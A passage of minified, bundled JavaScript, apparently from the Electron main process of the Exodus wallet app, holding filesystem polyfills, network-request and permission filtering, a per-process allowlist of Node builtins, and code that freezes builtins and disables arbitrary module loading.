          if (void 0 !== this.start) {
            if ("number" != typeof this.start) throw TypeError("start must be a Number");
            if (void 0 === this.end) this.end = 1 / 0;
            else if ("number" != typeof this.end) throw TypeError("end must be a Number");
            if (this.start > this.end) throw new Error("start must be <= end");
            this.pos = this.start;
          }
          if (null !== this.fd)
            return void process.nextTick(function () {
              i._read();
            });
          e.open(this.path, this.flags, this.mode, function (e, t) {
            if (e) return i.emit("error", e), void (i.readable = !1);
            (i.fd = t), i.emit("open", t), i._read();
          });
        },
        WriteStream: function t(n, r) {
          if (!(this instanceof t)) return new t(n, r);
          o.call(this);
          this.path = n;
          this.fd = null;
          this.writable = !0;
          this.flags = "w";
          this.encoding = "binary";
          this.mode = 438;
          this.bytesWritten = 0;
          r = r || {};
          var i = Object.keys(r);
          for (var s = 0, c = i.length; s < c; s++) {
            var a = i[s];
            this[a] = r[a];
          }
          if (void 0 !== this.start) {
            if ("number" != typeof this.start) throw TypeError("start must be a Number");
            if (this.start < 0) throw new Error("start must be >= zero");
            this.pos = this.start;
          }
          this.busy = !1;
          this._queue = [];
          null === this.fd && ((this._open = e.open), this._queue.push([this._open, this.path, this.flags, this.mode, void 0]), this.flush());
        },
      };
    };
  },
  function (e, t) {
    e.exports = require("constants");
  },
  function (e, t, n) {
    var o = n(125),
      r = process.cwd,
      i = null,
      s = process.platform;
    process.cwd = function () {
      return i || (i = r.call(process)), i;
    };
    try {
      process.cwd();
    } catch (e) {}
    if ("function" == typeof process.chdir) {
      var c = process.chdir;
      (process.chdir = function (e) {
        (i = null), c.call(process, e);
      }),
        Object.setPrototypeOf && Object.setPrototypeOf(process.chdir, c);
    }
    e.exports = function (e) {
      o.hasOwnProperty("O_SYMLINK") &&
        process.version.match(/^v0\.6\.[0-2]|^v0\.5\./) &&
        (function (e) {
          (e.lchmod = function (t, n, r) {
            e.open(t, o.O_WRONLY | o.O_SYMLINK, n, function (t, o) {
              t
                ? r && r(t)
                : e.fchmod(o, n, function (t) {
                    e.close(o, function (e) {
                      r && r(t || e);
                    });
                  });
            });
          }),
            (e.lchmodSync = function (t, n) {
              var r,
                i = e.openSync(t, o.O_WRONLY | o.O_SYMLINK, n),
                s = !0;
              try {
                (r = e.fchmodSync(i, n)), (s = !1);
              } finally {
                if (s)
                  try {
                    e.closeSync(i);
                  } catch (e) {}
                else e.closeSync(i);
              }
              return r;
            });
        })(e);
      e.lutimes ||
        (function (e) {
          o.hasOwnProperty("O_SYMLINK") && e.futimes
            ? ((e.lutimes = function (t, n, r, i) {
                e.open(t, o.O_SYMLINK, function (t, o) {
                  t
                    ? i && i(t)
                    : e.futimes(o, n, r, function (t) {
                        e.close(o, function (e) {
                          i && i(t || e);
                        });
                      });
                });
              }),
              (e.lutimesSync = function (t, n, r) {
                var i,
                  s = e.openSync(t, o.O_SYMLINK),
                  c = !0;
                try {
                  (i = e.futimesSync(s, n, r)), (c = !1);
                } finally {
                  if (c)
                    try {
                      e.closeSync(s);
                    } catch (e) {}
                  else e.closeSync(s);
                }
                return i;
              }))
            : e.futimes &&
              ((e.lutimes = function (e, t, n, o) {
                o && process.nextTick(o);
              }),
              (e.lutimesSync = function () {}));
        })(e);
      (e.chown = r(e.chown)),
        (e.fchown = r(e.fchown)),
        (e.lchown = r(e.lchown)),
        (e.chmod = t(e.chmod)),
        (e.fchmod = t(e.fchmod)),
        (e.lchmod = t(e.lchmod)),
        (e.chownSync = i(e.chownSync)),
        (e.fchownSync = i(e.fchownSync)),
        (e.lchownSync = i(e.lchownSync)),
        (e.chmodSync = n(e.chmodSync)),
        (e.fchmodSync = n(e.fchmodSync)),
        (e.lchmodSync = n(e.lchmodSync)),
        (e.stat = c(e.stat)),
        (e.fstat = c(e.fstat)),
        (e.lstat = c(e.lstat)),
        (e.statSync = a(e.statSync)),
        (e.fstatSync = a(e.fstatSync)),
        (e.lstatSync = a(e.lstatSync)),
        e.chmod &&
          !e.lchmod &&
          ((e.lchmod = function (e, t, n) {
            n && process.nextTick(n);
          }),
          (e.lchmodSync = function () {}));
      e.chown &&
        !e.lchown &&
        ((e.lchown = function (e, t, n, o) {
          o && process.nextTick(o);
        }),
        (e.lchownSync = function () {}));
      "win32" === s &&
        (e.rename =
          "function" != typeof e.rename
            ? e.rename
            : (function (t) {
                function n(n, o, r) {
                  var i = Date.now(),
                    s = 0;
                  t(n, o, function c(a) {
                    if (a && ("EACCES" === a.code || "EPERM" === a.code) && Date.now() - i < 6e4)
                      return (
                        setTimeout(function () {
                          e.stat(o, function (e, i) {
                            e && "ENOENT" === e.code ? t(n, o, c) : r(a);
                          });
                        }, s),
                        void (s < 100 && (s += 10))
                      );
                    r && r(a);
                  });
                }
                return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n;
              })(e.rename));
      function t(t) {
        return t
          ? function (n, o, r) {
              return t.call(e, n, o, function (e) {
                u(e) && (e = null), r && r.apply(this, arguments);
              });
            }
          : t;
      }
      function n(t) {
        return t
          ? function (n, o) {
              try {
                return t.call(e, n, o);
              } catch (e) {
                if (!u(e)) throw e;
              }
            }
          : t;
      }
      function r(t) {
        return t
          ? function (n, o, r, i) {
              return t.call(e, n, o, r, function (e) {
                u(e) && (e = null), i && i.apply(this, arguments);
              });
            }
          : t;
      }
      function i(t) {
        return t
          ? function (n, o, r) {
              try {
                return t.call(e, n, o, r);
              } catch (e) {
                if (!u(e)) throw e;
              }
            }
          : t;
      }
      function c(t) {
        return t
          ? function (n, o, r) {
              function i(e, t) {
                t && (t.uid < 0 && (t.uid += 4294967296), t.gid < 0 && (t.gid += 4294967296)), r && r.apply(this, arguments);
              }
              return "function" == typeof o && ((r = o), (o = null)), o ? t.call(e, n, o, i) : t.call(e, n, i);
            }
          : t;
      }
      function a(t) {
        return t
          ? function (n, o) {
              var r = o ? t.call(e, n, o) : t.call(e, n);
              return r && (r.uid < 0 && (r.uid += 4294967296), r.gid < 0 && (r.gid += 4294967296)), r;
            }
          : t;
      }
      function u(e) {
        if (!e) return !0;
        if ("ENOSYS" === e.code) return !0;
        var t = !process.getuid || 0 !== process.getuid();
        return !(!t || ("EINVAL" !== e.code && "EPERM" !== e.code));
      }
      (e.read =
        "function" != typeof e.read
          ? e.read
          : (function (t) {
              function n(n, o, r, i, s, c) {
                var a;
                if (c && "function" == typeof c) {
                  var u = 0;
                  a = function (l, d, f) {
                    if (l && "EAGAIN" === l.code && u < 10) return u++, t.call(e, n, o, r, i, s, a);
                    c.apply(this, arguments);
                  };
                }
                return t.call(e, n, o, r, i, s, a);
              }
              return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n;
            })(e.read)),
        (e.readSync =
          "function" != typeof e.readSync
            ? e.readSync
            : ((l = e.readSync),
              function (t, n, o, r, i) {
                for (var s = 0; ; )
                  try {
                    return l.call(e, t, n, o, r, i);
                  } catch (e) {
                    if ("EAGAIN" === e.code && s < 10) {
                      s++;
                      continue;
                    }
                    throw e;
                  }
              }));
      var l;
    };
  },
  function (e, t, n) {
    "use strict";
    n.r(t);
    var o = n(0),
      r = n(44),
      i = n.n(r),
      s = n(2),
      c = n.n(s),
      a = n(14),
      u = n(1),
      l = n(29),
      d = n(6),
      f = n(37);
    const p = u.ENV_PROD ? "./" : "src/",
      h = c.a.join(o.app.getAppPath(), p),
      w = i()(process.argv);
    function m(e, { prefix: t, mimetypes: n }) {
      return e.getURL().startsWith(t) && n.includes(e.getMimeType());
    }
    const [b, y, g, E] = [1, 2, 3, 4];
    function v(e, t) {
      const n = Object(f.getRequestRules)(e, t);
      if (!n) return g;
      if ("block_silent" === n) return E;
      const { protocols: o, domains: r } = n,
        { protocol: i, hostname: s, pathname: u } = t,
        d = ["http:", "ws:"].includes(i),
        p = ["localhost", "127.0.0.1"].includes(s);
      if (d && !p) return g;
      const m = "file:" === i,
        y = ["exodus-nfts-api:"].includes(i),
        v = ["devtools:", "chrome-extension:"].includes(i),
        O = ["https:", "wss:", "file:", "exodus-nfts-api:"].includes(i);
      if (
        m &&
        !(function (e) {
          const t = Object(a.fileURLToPath)(e),
            n = c.a.relative(h, t),
            o = c.a.resolve(t),
            r = Object(l.imagesDir)();
          if (n.includes("..") && !o.startsWith(r)) return !1;
          const i = [h, r];
          return w.datadir && i.push(w.datadir), i.some((e) => o.startsWith(e));
        })(t)
      )
        return u.endsWith(".map") ? E : g;
      if (v) return b;
      if ("*" !== o) {
        if (!((p && d && o.includes("localhost")) || (O && o.includes(i)))) return g;
      }
      if ("*" !== r && !m && !y) {
        const e = (function (e) {
          return e.port ? parseInt(e.port, 10) : ["https:", "wss:"].includes(e.protocol) ? 443 : ["http:", "ws:"].includes(e.protocol) ? 80 : null;
        })(t);
        if (!((443 === e && r.includes(`${s}`)) || (e && r.includes(`${s}:${e}`)) || r.includes(`${s}:*`))) return g;
      }
      return b;
    }
    const O = new WeakSet();
    function S(e) {
      if (O.has(e)) return;
      O.add(e), e.setSSLConfig({ minVersion: "tls1.2" });
      const { webRequest: t } = e;
      t.onBeforeRequest((t, n) => {
        const o = new a.URL(t.url),
          r = v(e, o),
          i = {};
        r === b || (r === y && u.ENV_EXODUS_PROD) || ((i.cancel = !0), r !== E && Object(d.showError)("network request", ` to ${o.toString()}`)), n(i);
      }),
        e.on("will-download", (e, t, n) => {
          try {
            if (
              (function (e, t) {
                const { downloads: n } = Object(f.getSessionRules)(t.session);
                for (const t of n)
                  if (m(e, t))
                    return (
                      !0 === t.open &&
                        e.once("done", () => {
                          o.shell.openPath(e.getSavePath());
                        }),
                      !0
                    );
                if (t.getURL().startsWith("devtools://") && m(e, { prefix: "blob:devtools://", mimetypes: ["image/png"] })) return !0;
                return !1;
              })(t, n)
            )
              return;
          } catch (e) {}
          e.preventDefault(), Object(d.showError)("download attempt");
        }),
        e.setPermissionRequestHandler((e, t, n, o) => {
          return n(k(e, t, o));
        }),
        e.setPermissionCheckHandler((e, t, n, o) => {
          return k(e, t, o);
        }),
        e.setSpellCheckerLanguages([]);
    }
    const D = ["accessibility-events", "window-placement", "background-sync"];
    function k(e, t, n) {
      const o = (function (e, t, n) {
        if (!e) return !1;
        if (!n.isMainFrame) return !1;
        const { permissions: o } = Object(f.getSessionRules)(e.session);
        return o.includes(t);
      })(e, t, n);
      return o || D.includes(t) || Object(d.showError)("unexpected permission request", ` to ${t}`), o;
    }
    o.app.on("ready", () => {
      S(o.session.defaultSession);
    }),
      o.app.on("session-created", (e) => {
        S(e);
      });
  },
  function (e, t, n) {
    const { app: o } = n(0);
    if (o.isReady()) throw new Error("Electron security must be imported before the app is ready");
    n(127), n(8);
  },
  function (e, t, n) {
    "use strict";
    e.exports = {
      getProcessName: function () {
        return "main";
      },
    };
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "allowedBuiltins", function () {
        return o;
      });
    const o = (e) => {
      const t = ["electron", "module"];
      switch (e) {
        case "main":
          return [...t, "child_process", "crypto", "assert", "constants", "events", "fs", "fs/promises", "os", "path", "stream", "url", "util", ...[]];
        case "core":
          return [...t, "crypto", "assert", "constants", "fs", "os", "path", "stream", "util", "zlib"];
        case "wallet":
          return [...t, "crypto", "assert", "buffer", "constants", "events", "fs", "os", "path", "stream", "url", "util", "zlib"];
        case "ui":
          return [...t, "crypto", "assert", "buffer", "constants", "events", "fs", "http", "https", "net", "os", "path", "querystring", "stream", "tls", "url", "util", "zlib"];
        case "recovery":
          return [...t, "assert", "buffer", "constants", "crypto", "fs", "os", "path", "stream", "util", "zlib"];
      }
      return [];
    };
  },
  function (e, t, n) {
    const { builtinModules: o } = n(59),
      r = Function.prototype.call.bind(Array.prototype.includes);
    e.exports = (e) => !e.startsWith("events/") && !e.endsWith("/") && ((e) => "electron" === e || r(o, e))(e.replace(/\/.*/, ""));
  },
  function (e, t, n) {
    if (void 0 !== globalThis.Buffer && globalThis.Buffer) {
      const Buffer = globalThis.Buffer;
      if (
        ((Buffer.poolSize = 0),
        (Buffer.allocUnsafe = function (e) {
          return Buffer.alloc(e);
        }),
        (Buffer.allocUnsafeSlow = Buffer.allocUnsafe),
        Buffer.TYPED_ARRAY_SUPPORT)
      ) {
        const { isBuffer: e } = Buffer;
        Buffer.isBuffer = (t) => t instanceof Uint8Array && e(t);
      }
      Object.freeze(Buffer);
    }
    const o = Object.getPrototypeOf(Int8Array);
    for (const e of [
      ...[Object, Array, Number, String, Function, Set, Map, WeakSet, WeakMap],
      ...[Reflect, TypeError, BigInt, URL, Date, JSON, Math],
      ...[Int8Array, Int16Array, Int32Array, DataView],
      ...[Uint8Array, Uint16Array, Uint32Array, o],
    ])
      Object.freeze(e);
    "undefined" != typeof crypto && crypto && crypto.subtle && (Object.freeze(crypto), Object.freeze(crypto.subtle));
    {
      const e = n(59),
        t = () => {
          throw new Error("require() of non-builtins has been disabled");
        };
      e._findPath = t;
      for (const n of Object.keys(e._extensions)) e._extensions[n] = t;
    }
    {
      const e = n(59),
        t = n(131),
        o = Function.prototype.call.bind(Array.prototype.includes),
        r = () => {
          const { allowedBuiltins: e } = n(130),
            { getProcessName: t } = n(129),
            o = t();
          return { processName: o, allowedModules: [...e(o)] };
        },
        { processName: i, allowedModules: s } = r(),
        c = (e, n) => {
          if ((t(e), "module" !== e && o(s, e))) return;
          throw new Error(`Requiring module "${e}" is not allowed` + ` in browser process "${i}" (parent: ${n})`);
        },
        a = e._resolveFilename.bind(e);
      e._resolveFilename = (e, t, ...n) => (c(e, t.id), a(e, t, ...n));
    }
    process.binding &&
      (process.binding = (e) => {
        throw new Error(`harden: process.binding(${JSON.stringify(e)}) has been disabled`);
      });
  },
  function (e, t) {
    const n = (...e) => {
      const t = e.reduce((e, t) => e.concat(((e) => e instanceof Error && e.stack)(t) ? t.stack : t, "\n"), "").trim();
      console._errorOriginal(t);
    };
    console._errorOriginal || ((console._errorOriginal = console.error.bind(console)), (console.error = n));
  },
  function (e, t, n) {
    n(133), n(132);
  },
  function (e, t, n) {
    const o = n(24),
      { format: r } = n(43),
      i = n(2),
      s = n(32);
    if (process.argv.includes("--eden-full-log-to-file")) {
      process.env.ELECTRON_ENABLE_LOGGING = 1;
      const e = i.join(s.homedir(), `exodus.${Date.now()}.log`),
        t = process.pid;
      let n = !0;
      const c = ({ ...r }) => {
        const i = JSON.stringify({ time: new Date().toISOString(), pid: t, ...r });
        o.appendFileSync(e, `${i}\n`), n && (o.chmodSync(e, 384), (n = !1));
      };
      for (const e of ["log", "warn", "error", "info", "debug"]) {
        const t = console[e].bind(console);
        console[e] = (...n) => {
          t(...n);
          const o = { level: "log" === e ? "info" : e, name: "browser", message: r(...n) },
            i = ((new Error().stack || "").split("\n")[2] || "").trim().match(/\((.*):([0-9]+):([0-9]+)\)$/);
          i && Object.assign(o, { source: i[1], line: Number(i[2]), column: Number(i[3]) }), c(o);
        };
      }
      (globalThis.EDEN_LOG_TO_FILE = { log: c }), console.log(`Logs are forwarded to ${e}`);
    }
  },
  function (e, t, n) {
    2 === process.argv.length && "--version" === process.argv[1] && (console.log(n(61).version), n(0).app.exit(0)),
      console.time("main"),
      console.log("ENV: production"),
      n(20).instantEvent("didStartMain"),
      n(134),
      n(128),
      n(99);
  },
]);
